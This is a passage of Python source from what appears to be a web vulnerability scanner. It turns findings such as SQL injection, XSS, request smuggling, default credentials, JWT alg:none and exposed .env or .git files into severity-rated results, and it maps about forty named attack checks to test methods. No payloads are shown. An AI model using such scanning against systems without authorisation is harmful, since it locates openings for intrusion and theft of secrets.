        if sm.get("cl_te") or sm.get("te_cl"):
            out.append(ScanResult("web-smuggling", host, port, "vulnerable",
                Severity.CRITICAL,
                f"HTTP request smuggling CL.TE={sm.get('cl_te')} TE.CL={sm.get('te_cl')}", sm))

        # Parameter Pollution
        for v in self.results.get("param_pollution", []):
            out.append(ScanResult("web-hpp", host, port, "vulnerable",
                Severity.MEDIUM,
                f"HPP param={v['parameter']} server-uses={v['behavior']}", v))

        # API endpoints
        for v in self.results.get("api_endpoints", []):
            sev = Severity.HIGH if any(k in v["path"] for k in ("admin","token")) \
                  else Severity.INFO
            out.append(ScanResult("web-api", host, port, "discovered", sev,
                f"API {v['path']} [{v['status']}]", v))

        # CMS plugins
        for v in self.results.get("cms_plugins", []):
            out.append(ScanResult("web-cms-plugin", host, port, "detected",
                Severity.INFO,
                f"WP {v['type']} {v['name']} v{v.get('version','?')}", v))

        # Subdomains
        for sub in self.results.get("subdomains", []):
            out.append(ScanResult("web-subdomain", host, port, "discovered",
                Severity.INFO, f"Subdomain: {sub}", {"subdomain": sub}))

        # CMS detection
        cms = self.results.get("cms", {})
        if cms:
            ver = cms.get("version", "unknown")
            sev = Severity.INFO
            # Flag known-vulnerable CMS versions
            if cms.get("name") == "WordPress" and ver != "unknown":
                try:
                    major = int(ver.split(".")[0])
                    if major < 6: sev = Severity.HIGH
                except Exception: pass
            out.append(ScanResult("web-cms", host, port, "detected", sev,
                f"{cms.get('name','?')} {ver}", cms))

        # SQLi POST
        for v in self.results.get("sqli_post", []):
            out.append(ScanResult("web-sqli-post", host, port, "vulnerable",
                Severity.CRITICAL,
                f"SQLi POST {v['url']} fields={v['fields']} pattern={v['pattern']}", v))

        # Discovered paths
        for d in self.results["directories"]:
            sev = Severity.HIGH if d["path"] in (".git", ".env", "backup") \
                  else Severity.INFO
            out.append(ScanResult("web-dir", host, port, "found", sev,
                f"/{d['path']} [{d['status']}]", d))

        # Tech fingerprint
        if self.results["tech"]:
            out.append(ScanResult("web-tech", host, port, "info", Severity.INFO,
                " | ".join(f"{k}={v}" for k, v in list(self.results["tech"].items())[:6]),
                self.results["tech"]))

        # Missing security headers
        if self.results["sec_headers"]:
            out.append(ScanResult("web-sec-headers", host, port, "misconfigured",
                Severity.MEDIUM,
                f"Missing headers: {', '.join(self.results['sec_headers'].keys())}",
                self.results["sec_headers"]))

        # WAF
        if self.results["waf"]:
            out.append(ScanResult("web-waf", host, port, "detected", Severity.INFO,
                f"WAF: {self.results['waf']}", {"waf": self.results["waf"]}))

        # SQLi
        for v in self.results["sqli"]:
            out.append(ScanResult("web-sqli", host, port, "vulnerable",
                Severity.CRITICAL, f"SQLi error-based param={v['parameter']} {v['url']}", v))

        # XSS
        for v in self.results["xss"]:
            out.append(ScanResult("web-xss", host, port, "vulnerable",
                Severity.HIGH, f"Reflected XSS param={v['parameter']} {v['url']}", v))

        # Open redirect
        for v in self.results["open_redirect"]:
            out.append(ScanResult("web-redirect", host, port, "vulnerable",
                Severity.MEDIUM, f"Open redirect param={v['parameter']}", v))

        # CORS
        cors = self.results["cors"]
        if cors and cors.get("vulnerable"):
            for detail in cors.get("details", []):
                sev = Severity.CRITICAL if detail.get("critical") else Severity.HIGH
                out.append(ScanResult("web-cors", host, port, "vulnerable", sev,
                    f"CORS reflects {detail['origin_sent']} credentials={detail['allow_credentials']}",
                    detail))

        # Default creds
        for v in self.results["default_creds"]:
            out.append(ScanResult("web-default-creds", host, port, "vulnerable",
                Severity.CRITICAL,
                f"Default creds {v['user']}:{v['pass']} @ /{v['path']}", v))

        # JWT none
        jwt = self.results["jwt_none"]
        if jwt and jwt.get("vulnerable"):
            out.append(ScanResult("web-jwt-none", host, port, "vulnerable",
                Severity.CRITICAL,
                f"JWT alg:none accepted @ {jwt.get('endpoint','')}",
                jwt))

        # Sensitive files
        for v in self.results["sensitive_files"]:
            sev = Severity.CRITICAL if v["path"] in (".git/HEAD", ".env") \
                  else Severity.HIGH
            out.append(ScanResult("web-sensitive-file", host, port, "exposed", sev,
                f"/{v['path']} ({v['status']}) {v['size']}B", v))

        # JS secrets
        for v in self.results["js_secrets"]:
            out.append(ScanResult("web-secret", host, port, "exposed",
                Severity.CRITICAL,
                f"Hardcoded {v['type']} in {v['source']}", v))

        return out


# ── Async wrapper for PhantomEngine integration ───────────────────────────────

async def web_scan_async(url: str, wordlist_file: str | None = None,
                         timeout: float = 8.0, threads: int = 10,
                         checks: list[str] | None = None) -> list[ScanResult]:
    """
    Async entry point — runs WebScanner in thread pool so it doesn't block
    the PhantomEngine event loop.

    checks: subset of ['dir','tech','sqli','xss','redirect','cors',
                        'creds','jwt','files','secrets']
            None = run all
    """
    loop = asyncio.get_event_loop()

    def _run():
        ws = WebScanner(url, timeout=timeout, threads=threads)
        if checks is None:
            ws.run_all(wordlist_file=wordlist_file)
        else:
            CHECK_MAP = {
                "dir":        lambda: ws.dir_brute(wordlist_file=wordlist_file),
                "tech":       ws.fingerprint_tech,
                "ssl":        ws.ssl_tls_test,
                "cms":        ws.detect_cms,
                "plugins":    ws.cms_plugin_enum,
                "errors":     ws.error_disclosure_test,
                "cookies":    ws.cookie_security_test,
                "clickjack":  ws.clickjacking_test,
                "csrf":       ws.csrf_test,
                "sqli":       ws.sqli_test,
                "sqli-post":  ws.sqli_post_test,
                "sqli-blind": ws.sqli_blind_test,
                "sqli-union": ws.sqli_union_test,
                "xss":        ws.xss_test,
                "xss-stored": ws.xss_stored_test,
                "xss-dom":    ws.xss_dom_test,
                "ssti":       ws.ssti_test,
                "lfi":        ws.lfi_test,
                "ssrf":       ws.ssrf_test,
                "xxe":        ws.xxe_test,
                "idor":       ws.idor_test,
                "upload":     ws.file_upload_test,
                "deser":      ws.deserialization_test,
                "proto":      ws.prototype_pollution_test,
                "crlf":       ws.crlf_test,
                "redirect":   ws.open_redirect_test,
                "cors":       ws.cors_test,
                "creds":      ws.default_creds_test,
                "jwt":        lambda: (ws.jwt_none_test(), ws.jwt_advanced_test()),
                "oauth":      ws.oauth_test,
                "graphql":    ws.graphql_test,
                "websocket":  ws.websocket_test,
                "methods":    ws.http_methods_test,
                "host":       ws.host_header_injection_test,
                "ratelimit":  ws.rate_limit_test,
                "cache":      ws.cache_poison_test,
                "smuggle":    ws.smuggling_probe,
                "hpp":        ws.param_pollution_test,
                "api":        ws.api_discovery_test,
                "subdomains": ws.subdomain_passive_test,
                "files":      ws.sensitive_files_test,
                "secrets":    ws.js_secret_scan,
            }
            for check in checks:
                fn = CHECK_MAP.get(check)
                if fn: fn()
        return ws.to_scan_results()

    return await loop.run_in_executor(None, _run)
